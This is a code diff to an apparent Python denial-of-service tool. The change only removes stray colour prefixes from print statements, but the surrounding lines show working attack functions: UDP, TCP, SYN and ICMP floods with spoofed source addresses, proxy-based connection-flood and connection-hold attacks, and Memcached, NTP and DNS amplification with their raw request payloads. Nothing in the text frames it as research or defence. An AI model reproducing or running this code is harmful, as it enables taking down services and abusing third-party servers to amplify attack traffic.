@@ -24,7 +24,7 @@ def random_port():
 
 def udp_flood(ip, port, duration):
     timeout = time.time() + duration
-    {Fore.GREEN}print("[*] Starting enhanced UDP flood...")
+    print("[*] Starting enhanced UDP flood...")
     while time.time() < timeout:
         try:
             spoofed_ip = random_ip()
@@ -40,7 +40,7 @@ def udp_flood(ip, port, duration):
 def tcp_flood(ip, port, duration):
     timeout = time.time() + duration
     flags = ['S', 'A', 'F', 'P', 'R', 'U']
-    {Fore.GREEN}print("[*] Starting enhanced TCP flood...")
+    print("[*] Starting enhanced TCP flood...")
     while time.time() < timeout:
         try:
             spoofed_ip = random_ip()
@@ -54,7 +54,7 @@ def tcp_flood(ip, port, duration):
 
 def syn_flood(ip, port, duration):
     timeout = time.time() + duration
-    {Fore.GREEN}print("[*] Starting smart SYN flood...")
+    print("[*] Starting smart SYN flood...")
     while time.time() < timeout:
         try:
             spoofed_ip = random_ip()
@@ -69,7 +69,7 @@ def syn_flood(ip, port, duration):
 
 def icmp_flood(ip, duration):  # port ignored
     timeout = time.time() + duration
-    {Fore.GREEN}print("[*] Starting stealth ICMP flood...")
+    print("[*] Starting stealth ICMP flood...")
     while time.time() < timeout:
         try:
             spoofed_ip = random_ip()
@@ -85,7 +85,7 @@ def icmp_flood(ip, duration):  # port ignored
 
 def cps_attack(ip, port, duration, proxies):
     timeout = time.time() + duration
-    {Fore.GREEN}print("[*] Starting connection-per-second attack via proxies...")
+    print("[*] Starting connection-per-second attack via proxies...")
     while time.time() < timeout:
         for proxy in proxies:
             try:
@@ -97,7 +97,7 @@ def cps_attack(ip, port, duration, proxies):
 
 def connection_hold(ip, port, duration, proxies):
     timeout = time.time() + duration
-    {Fore.GREEN}print("[*] Starting connection hold attack via proxies...")
+    print("[*] Starting connection hold attack via proxies...")
     while time.time() < timeout:
         for proxy in proxies:
             try:
@@ -112,7 +112,7 @@ def connection_hold(ip, port, duration, proxies):
 
 def memcached_amp(ip, port, duration):
     timeout = time.time() + duration
-    {Fore.GREEN}print("[*] Starting Memcached Amplification...")
+    print("[*] Starting Memcached Amplification...")
     payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
     while time.time() < timeout:
         pkt = IP(src=random_ip(), dst=ip) / UDP(sport=random.randint(1024, 65535), dport=port) / Raw(load=payload)
@@ -120,7 +120,7 @@ def memcached_amp(ip, port, duration):
 
 def ntp_amp(ip, port, duration):
     timeout = time.time() + duration
-    {Fore.GREEN}print("[*] Starting NTP Amplification...")
+    print("[*] Starting NTP Amplification...")
     payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
     while time.time() < timeout:
         pkt = IP(src=random_ip(), dst=ip) / UDP(dport=port) / Raw(load=payload)
@@ -128,7 +128,7 @@ def ntp_amp(ip, port, duration):
 
 def dns_amp(ip, port, duration):
     timeout = time.time() + duration
-    {Fore.GREEN}print("[*] Starting DNS Amplification...")
+    print("[*] Starting DNS Amplification...")
     while time.time() < timeout:
         pkt = IP(src=random_ip(), dst=ip) / UDP(dport=port) / DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ANY"))
         send(pkt, verbose=0)
@@ -136,15 +136,15 @@ def dns_amp(ip, port, duration):
 # --- Minecraft Modes (placeholder) ---
 
 def mcbot(ip, port, duration):
-    {Fore.GREEN}print("[!] MCBOT attack - To be implemented.")
+    print("[!] MCBOT attack - To be implemented.")
     time.sleep(duration)
 
 def mcstatus(ip, port, duration):
-    {Fore.GREEN}print("[!] Minecraft status ping - Placeholder.")
+    print("[!] Minecraft status ping - Placeholder.")
     time.sleep(duration)
 
 def mcpe_status(ip, port, duration):
-    {Fore.GREEN}print("[!] Minecraft PE status ping - Placeholder.")
+    print("[!] Minecraft PE status ping - Placeholder.")
     time.sleep(duration)
 
 # --- PROXY LOADER ---
